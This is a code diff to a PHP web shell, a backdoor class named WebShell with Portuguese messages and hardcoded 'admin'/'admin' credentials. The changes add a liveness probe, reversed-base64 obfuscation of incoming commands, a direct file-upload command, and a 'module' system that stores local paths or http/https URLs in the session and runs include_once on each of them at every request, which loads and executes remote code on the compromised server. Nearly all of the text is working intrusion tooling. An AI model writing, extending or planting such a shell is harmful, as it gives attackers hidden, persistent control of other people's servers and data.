@@ -1,4 +1,8 @@
 <?php
+if(isset($_GET['st'])){
+	exit('online');
+}
+
 session_start();
 
 class WebShell{
@@ -11,17 +15,20 @@ class WebShell{
 	private $content_type = 'text/plain;charset=utf-8;';
 	private $outputEncoded = false;
 	
-	public function getValue($name, $default_value=false, $encoded=false){
+	public function getValue($name, $default_value=false, $encoded=false, $rev=false){
 		$v = isset($_GET[$name]) ? $_GET[$name] : (isset($_POST[$name]) ? $_POST[$name] : $default_value);
-		return $encoded ? @base64_decode($v) : $v;
+		return $encoded ? @base64_decode($rev?strrev($v):$v) : $v;
 	}
 	public function __construct($user=false, $pass=false){
 		$this->credentials = (object) array('user' => false, 'pass' => false);
 		$this->encoded = intval($this->getValue('e', 0)) == 1;
 		$this->outputEncoded = intval($this->getValue('b', '0')) == 1;
-		$cmd = $this->getValue('a', '', $this->encoded);
+		$cmd = $this->getValue('a', '', $this->encoded, true);
 		$this->credentials->user = $user;
 		$this->credentials->pass = $pass;
+		if(!isset($_SESSION['modules'])){
+			$_SESSION['modules'] = array();
+		}
 
 		if(strlen($cmd) > 0){
 			$cmd = explode(' ', $cmd, 2);
@@ -76,6 +83,7 @@ class WebShell{
 		$_SESSION['uploading'] = false;
 		$_SESSION['upload_name'] = '';
 		$_SESSION['upload_tmp'] = '';
+		$_SESSION['modules'] = array();
 
 		if($this->is_win){
 			$_SESSION['path'] = str_replace('\\', '/', substr($_SESSION['path'], 2));
@@ -84,6 +92,28 @@ class WebShell{
 			$_SESSION['path'] .= '/';
 		}
 		return;
+	}
+	public function moduleExists($name){
+		return isset($_SESSION['modules'][$name]);
+	}
+	public function moduleAdd($name, $file){
+		if(isset($_SESSION['modules'][$name])){
+			return "Modulo '".$name."' já foi carregado";
+		}
+		$_SESSION['modules'][$name] = $file;
+		return "Modulo '".$name."' - '".$file."' adicionado";
+	}
+	public function moduleRemove($name){
+		if(isset($_SESSION['modules'][$name])){
+			unset($_SESSION['modules'][$name]);
+			return "Modulo '".$name."' removido";
+		}
+		return "Modulo '".$name."' não foi carregado";
+	}
+	public function moduleLoad(){
+		foreach($_SESSION['modules'] as $name => $file){
+			@include_once($file);
+		}
 	}
 	public function on($cmd, $callback){
 		if($this->cmd){
@@ -143,8 +173,7 @@ class WebShell{
 
 
 $wShell = new  WebShell('admin', 'admin');
-
-
+$wShell->moduleLoad();
 $wShell->on('cd', function($args, $len) use ($wShell){
 
 
@@ -191,17 +220,57 @@ $wShell->on('download', function($args, $len) use ($wShell){
 	}
 	return;
 });
+$wShell->on('upload', function($args, $len) use ($wShell){
+	if($len < 1){
+		return;
+	}
+	$info = (object) pathinfo($args);
+	if($len < 1 || !isset($info->basename) || strlen($info->basename) < 1){
+		$wShell->setResponse('Não foi informado o nome do arquivo', 400);
+		return;
+	}
+	$path = $wShell->local_path(isset($info->dirname) ? $info->dirname : '');
+	if(!$path){
+		$wShell->setResponse("O path '".(isset($info->dirname) ? $info->dirname : $_SESSION['path'])."' não foi encontrado", 404);
+		return;
+	}
+	if(!is_writable($path)){
+		$wShell->setResponse("Usuário não tem permissão de escrita do diretório '".$path."'", 403);
+		return;
+	}
+	if(file_exists($path.$info->basename)){
+		$wShell->setResponse("O arquivo '".$path.$info->basename."' já existe no servidor", 202);
+		return;
+	}
+	if(!is_writable($path)){
+		$wShell->setResponse("Usuário não tem permissão de escrita do diretório '".$path."'", 403);
+		return;
+	}
+	if(!isset($_FILES['f'])){
+		$wShell->setResponse('Nenhum arquivo foi enviado', 400);
+		return;
+	}
+	if(!is_uploaded_file($_FILES['f']['tmp_name'])){
+		$wShell->setResponse('Arquivo não foi enviado corretamente', 406);
+		return;
+	}
+	if(@move_uploaded_file($_FILES['f']['tmp_name'], $path.$info->basename)){
+		$wShell->setResponse("Arquivo salvo em '".$path.$info->basename."'", 201);
+	}
+	else{
+		$wShell->setResponse("Não foi possível mover o arquivo de '".$_FILES['f']['tmp_name']."' para '".$path.$info->basename."'");
+	}
+	return;
+
+});
 $wShell->on('start-upload', function($args, $len) use ($wShell){
 	if($_SESSION['uploading']){
 		$wShell->setResponse('Já existe um upload em progress, use cancel-upload', 202);
 		return;
 	}
-	if($len < 1){
-		return;
-	}
 	$info = (object) pathinfo($args);
 
-	if(!isset($info->basename) || strlen($info->basename) < 1){
+	if($len < 1 || !isset($info->basename) || strlen($info->basename) < 1){
 		$wShell->setResponse('Não foi informado o nome do arquivo', 400);
 		return;
 	}
@@ -271,5 +340,36 @@ $wShell->on('cancel-upload', function($args, $len) use ($wShell){
 		@unlink($_SESSION['upload_tmp']);
 	}
 	return;
+});
+//module-add name file
+$wShell->on('module-add', function($args, $len) use ($wShell){
+	$args = explode(' ', $args, 2);
+	if($len < 1 || !is_array($args) || sizeof($args) != 2 || strlen($args[0]) < 1 || strlen($args[1]) < 1){
+		return $wShell->setResponse('Use module-add [nome] [arquivo]', 400);
+	}
+	if(!preg_match('(^https:\/\/|^http:\/\/)', $args[1])){
+		$args[1] = $wShell->local_path($args[1]);
+		if(!$args[1] || !is_file($args[1])){
+			return $wShell->setResponse("Arquivo '".$args[1]."' não foi encontrado", 404);
+		}
+		if(!is_readable($args[1])){
+			return $wShell->setResponse("Não é possível ler o arquivo '".$args[1]."'", 404);
+		}
+	}
+	return $wShell->setResponse($wShell->moduleAdd($args[0], $args[1]));
+});
+$wShell->on('module-remove', function($args, $len) use ($wShell){
+	if($len < 1){
+		return $wShell->setResponse('Use module-remove [nome]', 400);
+	}
+	return $wShell->setResponse($wShell->moduleRemove($args));
+});
+$wShell->on('module-list', function($args, $len) use ($wShell){
+	$response = "Modulos:".PHP_EOL;
+
+	foreach($_SESSION['modules'] as $name => $file){
+		$response .= $name.' => '.$file;
+	}
+	$wShell->setResponse($response);
 });
 $wShell->response();
